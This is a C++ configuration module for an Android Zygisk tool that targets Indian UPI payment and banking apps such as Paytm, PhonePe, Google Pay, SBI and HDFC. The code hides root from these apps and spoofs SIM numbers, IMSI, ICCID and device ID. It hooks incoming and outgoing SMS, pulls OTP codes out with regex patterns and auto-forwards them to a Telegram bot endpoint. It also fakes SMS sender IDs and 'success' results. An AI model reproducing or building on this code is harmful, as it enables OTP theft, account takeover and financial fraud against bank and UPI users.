#include "config.hpp"

#include "upi_registry.hpp"
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <sys/stat.h>
#include <unistd.h>

namespace {

std::string trim(const std::string& input) {
    auto start = input.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    auto end = input.find_last_not_of(" \t\r\n");
    return input.substr(start, end - start + 1);
}

bool parse_bool(const std::string& json, const std::string& key, bool default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    auto value_start = json.find_first_not_of(" \t\r\n", pos + 1);
    if (value_start == std::string::npos) return default_value;
    if (json.compare(value_start, 4, "true") == 0) return true;
    if (json.compare(value_start, 5, "false") == 0) return false;
    return default_value;
}

std::string parse_string(const std::string& json, const std::string& key, const std::string& default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return default_value;
    auto end = json.find('"', pos + 1);
    if (end == std::string::npos) return default_value;
    return json.substr(pos + 1, end - pos - 1);
}

std::vector<std::string> parse_string_array(const std::string& json, const std::string& key) {
    std::vector<std::string> result;
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return result;
    pos = json.find('[', pos);
    if (pos == std::string::npos) return result;
    auto end = json.find(']', pos);
    if (end == std::string::npos) return result;

    std::string array_content = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < array_content.size()) {
        auto quote_start = array_content.find('"', cursor);
        if (quote_start == std::string::npos) break;
        auto quote_end = array_content.find('"', quote_start + 1);
        if (quote_end == std::string::npos) break;
        result.push_back(array_content.substr(quote_start + 1, quote_end - quote_start - 1));
        cursor = quote_end + 1;
    }
    return result;
}

std::map<std::string, std::string> parse_headers(const std::string& json) {
    std::map<std::string, std::string> headers;
    const std::string key = "\"forward_headers\"";
    auto pos = json.find(key);
    if (pos == std::string::npos) return headers;
    pos = json.find('{', pos);
    if (pos == std::string::npos) return headers;
    auto end = json.find('}', pos);
    if (end == std::string::npos) return headers;

    std::string block = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < block.size()) {
        auto key_start = block.find('"', cursor);
        if (key_start == std::string::npos) break;
        auto key_end = block.find('"', key_start + 1);
        if (key_end == std::string::npos) break;
        auto colon = block.find(':', key_end);
        if (colon == std::string::npos) break;
        auto val_start = block.find('"', colon);
        if (val_start == std::string::npos) break;
        auto val_end = block.find('"', val_start + 1);
        if (val_end == std::string::npos) break;

        headers[block.substr(key_start + 1, key_end - key_start - 1)] =
            block.substr(val_start + 1, val_end - val_start - 1);
        cursor = val_end + 1;
    }
    return headers;
}

std::map<std::string, int> parse_int_map(const std::string& json, const std::string& key) {
    std::map<std::string, int> result;
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return result;
    pos = json.find('{', pos);
    if (pos == std::string::npos) return result;
    auto end = json.find('}', pos);
    if (end == std::string::npos) return result;

    std::string block = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < block.size()) {
        auto key_start = block.find('"', cursor);
        if (key_start == std::string::npos) break;
        auto key_end = block.find('"', key_start + 1);
        if (key_end == std::string::npos) break;
        auto colon = block.find(':', key_end);
        if (colon == std::string::npos) break;
        auto value_start = block.find_first_not_of(" \t\r\n", colon + 1);
        if (value_start == std::string::npos) break;
        size_t value_end = value_start;
        while (value_end < block.size() &&
               (std::isdigit(static_cast<unsigned char>(block[value_end])) || block[value_end] == '-')) {
            ++value_end;
        }
        try {
            result[block.substr(key_start + 1, key_end - key_start - 1)] =
                std::stoi(block.substr(value_start, value_end - value_start));
        } catch (...) {}
        cursor = value_end + 1;
    }
    return result;
}

std::map<std::string, bool> parse_bool_map(const std::string& json, const std::string& key) {
    std::map<std::string, bool> result;
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return result;
    pos = json.find('{', pos);
    if (pos == std::string::npos) return result;
    auto end = json.find('}', pos);
    if (end == std::string::npos) return result;

    std::string block = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < block.size()) {
        auto key_start = block.find('"', cursor);
        if (key_start == std::string::npos) break;
        auto key_end = block.find('"', key_start + 1);
        if (key_end == std::string::npos) break;
        auto colon = block.find(':', key_end);
        if (colon == std::string::npos) break;
        auto value_start = block.find_first_not_of(" \t\r\n", colon + 1);
        if (value_start == std::string::npos) break;

        result[block.substr(key_start + 1, key_end - key_start - 1)] =
            block.compare(value_start, 4, "true") == 0;
        cursor = key_end + 1;
    }
    return result;
}

std::string read_file(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) return "";
    std::ostringstream ss;
    ss << file.rdbuf();
    return ss.str();
}

int parse_int(const std::string& json, const std::string& key, int default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    auto start = json.find_first_not_of(" \t\r\n", pos + 1);
    if (start == std::string::npos) return default_value;
    size_t end = start;
    while (end < json.size() && (std::isdigit(static_cast<unsigned char>(json[end])) || json[end] == '-')) {
        ++end;
    }
    try {
        return std::stoi(json.substr(start, end - start));
    } catch (...) {
        return default_value;
    }
}

bool is_active_hook_package(const std::string& package) {
    if (package.empty()) return false;
    const std::string active = trim(read_file("/data/local/tmp/hivirtus_active_hook_pkg.txt"));
    return !active.empty() && active == package;
}

bool package_in_scope_list(const std::string& package) {
    if (package.empty()) return false;
    static const char* files[] = {
        "/data/local/tmp/hivirtus_hooked_pkgs.txt",
        "/data/local/tmp/hivirtus_active_upi_all.txt",
        nullptr};
    for (const char** path = files; *path; ++path) {
        const std::string content = read_file(*path);
        if (content.empty()) continue;
        size_t start = 0;
        while (start < content.size()) {
            size_t end = content.find('\n', start);
            if (end == std::string::npos) end = content.size();
            const std::string line = trim(content.substr(start, end - start));
            if (line == package) return true;
            start = end + 1;
        }
    }
    return false;
}

bool is_explicitly_hooked(const ModuleConfig& config, const std::string& package) {
    if (config.hooked_upi_apps.empty()) return false;
    const auto star = config.hooked_upi_apps.find("*");
    if (star != config.hooked_upi_apps.end() && star->second) return true;
    const auto it = config.hooked_upi_apps.find(package);
    if (it != config.hooked_upi_apps.end()) return it->second;
    return false;
}

}  // namespace

static std::string json_escape_cfg(const std::string& input) {
    std::string out;
    out.reserve(input.size() + 8);
    for (char c : input) {
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            default: out += c; break;
        }
    }
    return out;
}

ConfigManager& ConfigManager::instance() {
    static ConfigManager manager;
    return manager;
}

bool ConfigManager::load() {
    const std::vector<std::string> paths = {
        "/data/local/tmp/hivirtus_zygisk_mode_config.json",
        "/data/adb/modules/hivirtus_zygisk_mode/config.json",
    };

    std::string json;
    for (const auto& path : paths) {
        json = read_file(path);
        if (!json.empty()) break;
    }

    if (json.empty()) {
        loaded_ = false;
        return false;
    }

    config_.hide_root = parse_bool(json, "hide_root", false);
    config_.hide_developer = parse_bool(json, "hide_developer", false);
    config_.hide_magisk = parse_bool(json, "hide_magisk", true);
    config_.hide_kernelsu = parse_bool(json, "hide_kernelsu", true);
    config_.hide_apatch = parse_bool(json, "hide_apatch", true);
    config_.hide_sukisu = parse_bool(json, "hide_sukisu", true);
    config_.hide_all_root_apps = parse_bool(json, "hide_all_root_apps", true);
    config_.enable_sim1_mock = parse_bool(json, "enable_sim1_mock", false);
    config_.enable_sim2_mock = parse_bool(json, "enable_sim2_mock", false);
    config_.enable_phone_spoof = parse_bool(json, "enable_phone_spoof", false);
    config_.enable_virtual_sim = parse_bool(json, "enable_virtual_sim", false);
    config_.mock_country_iso = parse_string(json, "mock_country_iso", config_.mock_country_iso);
    config_.mock_phone_sim1 = parse_string(json, "mock_phone_sim1", config_.mock_phone_sim1);
    config_.mock_phone_sim2 = parse_string(json, "mock_phone_sim2", config_.mock_phone_sim2);
    config_.mock_operator_name_sim1 =
        parse_string(json, "mock_operator_name_sim1", config_.mock_operator_name_sim1);
    config_.mock_operator_name_sim2 =
        parse_string(json, "mock_operator_name_sim2", config_.mock_operator_name_sim2);
    config_.mock_operator_numeric_sim1 =
        parse_string(json, "mock_operator_numeric_sim1", config_.mock_operator_numeric_sim1);
    config_.mock_operator_numeric_sim2 =
        parse_string(json, "mock_operator_numeric_sim2", config_.mock_operator_numeric_sim2);
    config_.mock_imsi_sim1 = parse_string(json, "mock_imsi_sim1", config_.mock_imsi_sim1);
    config_.mock_imsi_sim2 = parse_string(json, "mock_imsi_sim2", config_.mock_imsi_sim2);
    config_.mock_iccid_sim1 = parse_string(json, "mock_iccid_sim1", config_.mock_iccid_sim1);
    config_.mock_iccid_sim2 = parse_string(json, "mock_iccid_sim2", config_.mock_iccid_sim2);
    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", false);
    config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", true);
    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", false);
    config_.auto_extract_otp = parse_bool(json, "auto_extract_otp", true);
    config_.auto_forward_token = parse_bool(json, "auto_forward_token", true);
    config_.forward_url = parse_string(json, "forward_url", config_.forward_url);
    config_.forward_method = parse_string(json, "forward_method", config_.forward_method);
    config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);
    config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);

    const std::vector<std::string> tg_paths = {
        "/data/local/tmp/hivirtus_telegram_credentials.json",
        "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json",
    };
    for (const auto& tg_path : tg_paths) {
        const std::string tg_json = read_file(tg_path);
        if (tg_json.empty()) continue;
        const std::string tg_token =
            parse_string(tg_json, "telegram_bot_token", config_.telegram_bot_token);
        const std::string tg_chat =
            parse_string(tg_json, "telegram_chat_id", config_.telegram_chat_id);
        if (!tg_token.empty()) config_.telegram_bot_token = tg_token;
        if (!tg_chat.empty()) config_.telegram_chat_id = tg_chat;
        if (!config_.telegram_bot_token.empty() && !config_.telegram_chat_id.empty()) {
            config_.auto_forward_token = true;
            config_.forward_url =
                "https://api.telegram.org/bot" + config_.telegram_bot_token + "/sendMessage";
        }
        break;
    }

    config_.inject_sender_id = parse_string(json, "inject_sender_id", config_.inject_sender_id);
    config_.inject_message_body = parse_string(json, "inject_message_body", config_.inject_message_body);
    config_.log_file = parse_string(json, "log_file", config_.log_file);
    config_.otp_patterns = parse_string_array(json, "otp_patterns");
    config_.forward_headers = parse_headers(json);
    config_.hooked_upi_apps = parse_bool_map(json, "hooked_upi_apps");
    config_.enable_device_id_spoof = parse_bool(json, "enable_device_id_spoof", false);
    config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
    config_.upi_timer_bonus_seconds = parse_int(json, "upi_timer_bonus_seconds", 20);
    config_.upi_app_timer_bonuses = parse_int_map(json, "upi_app_timer_bonuses");
    config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", false);
    config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
    config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", true);
    config_.prefix_enabled = parse_bool(json, "prefix_enabled", false);
    config_.prefix_text = parse_string(json, "prefix_text", config_.prefix_text);
    config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
    config_.hook_all_upi_apps = parse_bool(json, "hook_all_upi_apps", true);

    if (config_.otp_patterns.empty()) {
        config_.otp_patterns = {
            R"(\b(\d{4,8})\b.*(?:otp|code|verification|verify|pin))",
            R"((?:otp|code|verification|verify|pin)[:\s]*(\d{4,8}))",
            R"(Your verification OTP code is (\d{4,8}))",
        };
    }

    if (!config_.has_mock_phone_configured()) {
        config_.enable_virtual_sim = false;
        config_.enable_sim1_mock = false;
        config_.enable_phone_spoof = false;
        config_.enable_sim2_mock = false;
    }

    loaded_ = true;
    return true;
}

void ConfigManager::reload() {
    load();
}

void ConfigManager::persist_runtime() {
    const auto& c = config_;
    const std::string path = "/data/local/tmp/hivirtus_zygisk_mode_config.json";
    std::ofstream out(path);
    if (!out.is_open()) return;
    out << "{\n"
        << "  \"hide_root\": " << (c.hide_root ? "true" : "false") << ",\n"
        << "  \"hide_developer\": " << (c.hide_developer ? "true" : "false") << ",\n"
        << "  \"hide_magisk\": " << (c.hide_magisk ? "true" : "false") << ",\n"
        << "  \"hide_kernelsu\": " << (c.hide_kernelsu ? "true" : "false") << ",\n"
        << "  \"hide_apatch\": " << (c.hide_apatch ? "true" : "false") << ",\n"
        << "  \"hide_sukisu\": " << (c.hide_sukisu ? "true" : "false") << ",\n"
        << "  \"hide_all_root_apps\": " << (c.hide_all_root_apps ? "true" : "false") << ",\n"
        << "  \"enable_virtual_sim\": " << (c.virtual_sim_active() ? "true" : "false") << ",\n"
        << "  \"enable_sim1_mock\": " << (c.enable_sim1_mock ? "true" : "false") << ",\n"
        << "  \"enable_sim2_mock\": " << (c.enable_sim2_mock ? "true" : "false") << ",\n"
        << "  \"enable_phone_spoof\": " << (c.enable_phone_spoof ? "true" : "false") << ",\n"
        << "  \"mock_country_iso\": \"" << json_escape_cfg(c.mock_country_iso) << "\",\n"
        << "  \"mock_phone_sim1\": \"" << json_escape_cfg(c.mock_phone_sim1) << "\",\n"
        << "  \"mock_phone_sim2\": \"" << json_escape_cfg(c.mock_phone_sim2) << "\",\n"
        << "  \"mock_operator_name_sim1\": \"" << json_escape_cfg(c.mock_operator_name_sim1) << "\",\n"
        << "  \"mock_operator_name_sim2\": \"" << json_escape_cfg(c.mock_operator_name_sim2) << "\",\n"
        << "  \"mock_operator_numeric_sim1\": \"" << json_escape_cfg(c.mock_operator_numeric_sim1) << "\",\n"
        << "  \"mock_operator_numeric_sim2\": \"" << json_escape_cfg(c.mock_operator_numeric_sim2) << "\",\n"
        << "  \"mock_imsi_sim1\": \"" << json_escape_cfg(c.mock_imsi_sim1) << "\",\n"
        << "  \"mock_imsi_sim2\": \"" << json_escape_cfg(c.mock_imsi_sim2) << "\",\n"
        << "  \"mock_iccid_sim1\": \"" << json_escape_cfg(c.mock_iccid_sim1) << "\",\n"
        << "  \"mock_iccid_sim2\": \"" << json_escape_cfg(c.mock_iccid_sim2) << "\",\n"
        << "  \"hook_incoming_sms\": " << (c.hook_incoming_sms ? "true" : "false") << ",\n"
        << "  \"hook_outgoing_sms\": " << (c.hook_outgoing_sms ? "true" : "false") << ",\n"
        << "  \"hook_upi_verification\": " << (c.hook_upi_verification ? "true" : "false") << ",\n"
        << "  \"auto_hook_foreground\": " << (c.auto_hook_foreground ? "true" : "false") << ",\n"
        << "  \"hook_all_upi_apps\": " << (c.hook_all_upi_apps ? "true" : "false") << ",\n"
        << "  \"intercept_fake_success\": " << (c.intercept_fake_success ? "true" : "false") << ",\n"
        << "  \"prefix_enabled\": " << (c.prefix_enabled ? "true" : "false") << ",\n"
        << "  \"prefix_text\": \"" << json_escape_cfg(c.prefix_text) << "\",\n"
        << "  \"override_incoming_sender\": " << (c.override_incoming_sender ? "true" : "false") << ",\n"
        << "  \"inject_sender_id\": \"" << json_escape_cfg(c.inject_sender_id) << "\",\n"
        << "  \"auto_forward_token\": " << (c.auto_forward_token ? "true" : "false") << ",\n"
        << "  \"telegram_bot_token\": \"" << json_escape_cfg(c.telegram_bot_token) << "\",\n"
        << "  \"telegram_chat_id\": \"" << json_escape_cfg(c.telegram_chat_id) << "\",\n"
        << "  \"forward_url\": \"" << json_escape_cfg(c.forward_url) << "\",\n"
        << "  \"log_file\": \"" << json_escape_cfg(c.log_file) << "\"\n"
        << "}\n";
    chmod(path.c_str(), 0644);
}

bool ConfigManager::apply_ui_save_file() {
    const char* save_path = "/data/local/tmp/hivirtus_ui_save.json";
    std::string json = read_file(save_path);
    if (json.empty()) return false;

    config_.hide_root = parse_bool(json, "hide_root", config_.hide_root);
    config_.hide_developer = parse_bool(json, "hide_developer", config_.hide_developer);
    config_.enable_sim1_mock = parse_bool(json, "enable_sim1_mock", config_.enable_sim1_mock);
    config_.enable_sim2_mock = parse_bool(json, "enable_sim2_mock", config_.enable_sim2_mock);
    config_.enable_phone_spoof = parse_bool(json, "enable_phone_spoof", config_.enable_phone_spoof);
    config_.enable_virtual_sim = parse_bool(json, "enable_virtual_sim", config_.enable_virtual_sim);
    // SMSTweaks alias
    if (parse_bool(json, "fake_number_enabled", false)) {
        config_.enable_sim1_mock = true;
        config_.enable_phone_spoof = true;
    }
    config_.mock_phone_sim1 = parse_string(json, "mock_phone_sim1", config_.mock_phone_sim1);
    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", config_.hook_incoming_sms);
    config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", config_.hook_outgoing_sms);
    config_.intercept_fake_success =
        parse_bool(json, "intercept_fake_success", config_.intercept_fake_success);
    if (parse_bool(json, "intercept_enabled", false)) {
        config_.intercept_fake_success = true;
        config_.hook_outgoing_sms = true;
    }
    config_.prefix_enabled = parse_bool(json, "prefix_enabled", config_.prefix_enabled);
    config_.prefix_text = parse_string(json, "prefix_text", config_.prefix_text);
    config_.override_incoming_sender =
        parse_bool(json, "override_incoming_sender", config_.override_incoming_sender);
    if (parse_bool(json, "sender_id_enabled", false)) {
        config_.override_incoming_sender = true;
    }
    config_.inject_sender_id = parse_string(json, "inject_sender_id", config_.inject_sender_id);
    if (config_.inject_sender_id == "AD-TEST-S") config_.inject_sender_id.clear();
    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", true);
    config_.hook_all_upi_apps = parse_bool(json, "hook_all_upi_apps", true);
    config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
    config_.auto_forward_token = parse_bool(json, "auto_forward_token", config_.auto_forward_token);
    if (parse_bool(json, "telegram_enabled", false)) {
        config_.auto_forward_token = true;
        config_.fake_intercept_telegram = true;
    }
    config_.fake_intercept_telegram =
        parse_bool(json, "fake_intercept_telegram", config_.fake_intercept_telegram);
    config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);
    config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);

    if (!config_.telegram_bot_token.empty() && !config_.telegram_chat_id.empty()) {
        FILE* tf = fopen("/data/local/tmp/hivirtus_telegram_credentials.json", "w");
        if (tf) {
            fprintf(tf,
                    "{\n  \"telegram_bot_token\": \"%s\",\n  \"telegram_chat_id\": \"%s\"\n}\n",
                    json_escape_cfg(config_.telegram_bot_token).c_str(),
                    json_escape_cfg(config_.telegram_chat_id).c_str());
            fclose(tf);
            chmod("/data/local/tmp/hivirtus_telegram_credentials.json", 0644);
        }
    }

    if (config_.enable_sim1_mock && config_.has_mock_phone_configured()) {
        config_.enable_phone_spoof = true;
        config_.enable_virtual_sim = true;
    }

    if (config_.hide_root) {
        config_.hide_magisk = config_.hide_kernelsu = config_.hide_apatch = true;
        config_.hide_sukisu = config_.hide_all_root_apps = true;
    }

    const std::string phone = config_.resolve_mock_phone();
    if (!phone.empty()) {
        FILE* f = fopen("/data/local/tmp/hivirtus_spoof_phone.txt", "w");
        if (f) {
            fprintf(f, "%s\n", phone.c_str());
            fclose(f);
            chmod("/data/local/tmp/hivirtus_spoof_phone.txt", 0644);
        }
    }

    persist_runtime();
    unlink(save_path);
    loaded_ = true;
    return true;
}

bool ModuleConfig::has_mock_phone_configured() const {
    const std::string phone = resolve_mock_phone();
    size_t digits = 0;
    for (char c : phone) {
        if (c >= '0' && c <= '9') digits++;
    }
    return digits >= 10;
}

std::string ModuleConfig::resolve_mock_phone() const {
    if (!mock_phone_sim1.empty()) {
        size_t digits = 0;
        for (char c : mock_phone_sim1) {
            if (c >= '0' && c <= '9') digits++;
        }
        if (digits >= 10) return mock_phone_sim1;
    }
    char buf[96] = {};
    FILE* f = fopen("/data/local/tmp/hivirtus_spoof_phone.txt", "r");
    if (!f) f = fopen("/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f)) {
            fclose(f);
            std::string phone = buf;
            if (!phone.empty() && phone.back() == '\n') phone.pop_back();
            return phone;
        }
        fclose(f);
    }
    return {};
}

bool ModuleConfig::virtual_sim_active() const {
    if (!has_mock_phone_configured()) return false;
    return enable_virtual_sim || enable_phone_spoof || enable_sim1_mock || enable_sim2_mock;
}

bool ModuleConfig::is_upi_app_hooked(const std::string& package) const {
    if (!upi_registry::is_hookable_user_app(package)) return false;
    if (upi_registry::is_module_own_app(package)) return false;
    if (!upi_registry::is_sms_hook_target(package) && !upi_registry::is_known_upi(package)) {
        return false;
    }

    if (hook_all_upi_apps && upi_registry::is_sms_hook_target(package)) return true;
    if (is_explicitly_hooked(*this, package)) return true;
    if (is_active_hook_package(package)) return true;
    if (package_in_scope_list(package)) return true;

    return false;
}

int default_timer_for_package(const std::string& package) {
    if (package == "net.one97.paytm") return 40;
    if (package == "com.phonepe.app") return 25;
    if (package == "com.google.android.apps.nbu.paisa.user") return 25;
    if (package.find("yespay") != std::string::npos) return 45;
    if (package.find("kreditbee") != std::string::npos ||
        package.find("stashfin") != std::string::npos ||
        package.find("branch") != std::string::npos ||
        package.find("loan") != std::string::npos) return 50;
    if (package.find("bank") != std::string::npos ||
        package.find("icici") != std::string::npos ||
        package.find("sbi") != std::string::npos ||
        package.find("hdfc") != std::string::npos) return 40;
    if (package == "com.dreamplug.androidapp") return 35;
    if (package == "in.org.npci.upiapp") return 20;
    return 20;
}

int ModuleConfig::timer_bonus_for_package(const std::string& package) const {
    const auto it = upi_app_timer_bonuses.find(package);
    if (it != upi_app_timer_bonuses.end() && it->second > 0) return it->second;
    if (upi_timer_bonus_seconds > 0) return upi_timer_bonus_seconds;
    return default_timer_for_package(package);
}
